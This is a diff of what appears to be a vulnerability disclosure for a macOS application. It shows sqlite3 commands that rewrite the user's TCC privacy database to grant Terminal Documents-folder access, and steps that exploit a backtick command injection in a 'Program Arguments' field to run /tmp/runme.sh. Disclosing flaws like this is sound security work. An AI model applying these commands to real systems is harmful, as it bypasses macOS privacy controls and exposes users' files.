@@ -29,7 +29,7 @@ echo FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "delete from access where service='kTCCServiceSystemPolicyDocumentsFolder' and client='com.apple.Terminal'";
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "INSERT INTO access VALUES('kTCCServiceSystemPolicyDocumentsFolder','com.apple.Terminal',0,2,2,1,readfile('/tmp/csreq.bin'),NULL,0,'UNUSED',NULL,NULL,CAST(strftime('%s','now') AS INTEGER));";
 ```
-7. OS Command Injection vulnerability exists in `Program Arguments`. Paste in the following bash command in the `Program Arguments field`: \`/tmp/runme.sh\`.
+7. OS Command Injection vulnerability exists in `Program Arguments` due to the lack of input validation for backtick characters. Paste in the following bash command in the `Program Arguments` field: \`/tmp/runme.sh\`.
 8. Since the application requests Full Disk Access (end user or MDA software has to grant it), we use the Command Injection to add a TCC entry, which allows us to grant any application on the system TCC permissions such as document folder or desktop read access. Click okay for the two prompts, then press keybinding key you selected earlier to trigger attack.
 
 ## Additional Information
